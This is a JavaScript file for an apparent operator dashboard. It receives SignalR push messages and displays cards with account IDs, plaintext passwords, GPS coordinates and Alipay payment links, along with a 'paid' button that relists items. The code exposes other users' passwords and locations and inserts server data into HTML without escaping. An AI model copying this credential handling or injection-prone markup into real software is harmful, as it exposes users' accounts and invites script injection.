var GLOBALS = GLOBALS || {};

$(function () {

    if (!window.localStorage) {
        alert("浏览器不支持localstorage");
        return false;
    } else {
        var storage = window.localStorage;
        //写入a字段
       // storage["a"] = 1;
       
        //写入c字段
       // storage.setItem("c", 3);
        console.log(storage["a"]);
        
        console.log(storage["c"]);
    }

    $(document).on("click", ".myPayOK", function () {
        var tmpId = $(this).attr("data-id");//编号  
        alert(tmpId);
        hub.server.zbStateReset(tmpId).done(function (result) {
            //window.Android.showToast('点击返回：' + okResult);
            if (result == 1) {
                alert("成功！");
              
                    
                $("#"+tmpId).remove();
                    


            } else {
                alert("重新上架失败！");
            }

        }).fail(function (err) {
            alert('错误：' + err);
        });
    })


    var hub = $.connection.myHub1;//注意大小写，同时第一个要小写，其他地方大小写要保持
    $.connection.hub.logging = true;   

    $.connection.hub.start({ transport: 'longPolling' }).done(function () {
        //{ transport: 'webSockets' } { transport: ['webSockets', 'longPolling'] }
       // window.Android.showToast("已经连接！" + $.connection.hub.id);
        //  hub.server.hello('msgtxt').done(function (result) { alert(result) });
        // var s = hub.client.hello();
        //alert("已经连接！" + $.connection.hub.id);


    }).fail(function (err) {
        // window.Android.showToast('连接失败：' + err);
    });



    function getOnlineInfo (okResult) {
        $("#LookOrder").empty();
        //alert(okResult);
        var data = $.parseJSON(okResult);
        for (var i = 0; i < data.length; i++) {

            $("#LookOrder").prepend(
                '<div style="border-radius: 10px; border: 1px solid rgb(204, 204, 204); border-image: none; margin-bottom: 20px;">' +
                ' <img style="left: 2160px; top: 1px; overflow: hidden; position: relative;" src="/images/yl.png">' +
                '<b style="top: -90px; display: block; position: relative;">用户名：' + data[i].USER_ID + '</b>' +
                '<b style="top: -75px; display: block; position: relative;">IP：' + data[i].Ip + '</b>' +
                '<b style="top: -60px; display: block; position: relative;">在线时间：' + data[i].OKTime + '</b>' +
                ' </div >'
            );
        }
        
        addVoice();
        

        
    };

    $.connection.hub.reconnecting(function () {

        $.connection.hub.stop();
        
    })
    setInterval(function () {

            if ($.connection.hub.state == 0 || $.connection.hub.state == 4) {
                //window.Android.playSoundOffline("voice/offline_operator.mp3");
               
                $.connection.hub.stop();
                // $.connection.hub.start({ transport: 'webSockets' });
                connectFunc();
            }
            // window.Android.showToast('ID:' + $.connection.hub.id);
        

    }, 3000); // Restart connection after 5 seconds.
    function connectFunc() {
        $.connection.hub.start({ transport: 'longPolling' }).done(function () {
           

        }).fail(function (err) {
           
        });
    }
   /* setInterval(function () {


        //   // window.Android.showToast('检测状态Ing' + $.connection.hub.state);
        if ($.connection.hub.state == 0 || $.connection.hub.state == 4) {
            //window.Android.playSoundOffline("voice/offline_operator.mp3");
            $.connection.hub.start({ transport: 'webSockets' });
        }
        // window.Android.showToast('ID:' + $.connection.hub.id);
    }, 5000); // Restart connection after 5 seconds.*/

    hub.client.NoticeLook = function (okResult) {

        //alert(okResult);
        var data = $.parseJSON(okResult);
        var isExitID = $("#" + data.uid).html();
       // alert(isExitID);
       // alert(data.qUrl);
        if (isExitID != undefined) {//存在了
            return;
        }
        $("#LookOrder").prepend(
            '<div  id='+ data.uid + ' style="border-radius: 10px; border: 1px solid rgb(204, 204, 204); border-image: none; margin-bottom: 20px;">' +
                ' <img style="left: 2160px; top: 1px; overflow: hidden; position: relative;" src="/images/yl.png">' +
            '<b style="top: -90px; display: block; position: relative;">账号：<span>' + data.uid + '</span></b>' +
            '<b style="top: -75px; display: block; position: relative;">密码：' + data.pwd + '</b>' +
            '<b style="top: -60px; display: block; position: relative;">坐标：' + data.gps + '</b>' +
            '<a href="alipays://platformapi/startapp?appId=20000691&url=' + data.qUrl +'" style="top: -30px;left:80px; display: block; position: relative;">H5支付' + '</a>' +
            '<b data-id=' + data.uid + ' class="myPayOK" style="top: -48px;left:200px;color:darkturquoise ; display: block; position: relative;">已支付</b>' +
                 ' </div >'
            );

        addVoice();
    };



    /*setInterval(function () {
        hub.server.onlineUsers().done(function (result) {
            getOnlineInfo(result);
            //alert(result);
        });
            

    }, 10000); 
*/


   
    function addVoice() {
        document.getElementById('audio').play();
    }

}); //end